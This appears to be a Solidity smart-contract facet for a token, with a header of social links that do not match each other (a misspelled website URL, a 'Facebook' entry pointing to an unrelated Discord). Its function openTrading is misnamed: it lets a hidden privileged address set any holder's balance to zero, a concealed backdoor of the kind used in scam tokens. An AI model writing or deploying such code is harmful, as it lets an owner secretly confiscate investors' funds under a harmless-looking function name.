/*
 * SPDX-License-Identifier: MIT
 * Website: hhttps://www.xrex.io/?utm_source=icodrops
 * Facebook: https://discord.gg/anichess
 * Twitter: https://twitter.com/xrexinc
 * Telegram: https://t.me/xrexofficial
 * Linkedin: https://linkedin.com/company/xrexinc/
 * Medium: https://medium.com/xrexio
 */
pragma solidity ^0.8.24;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
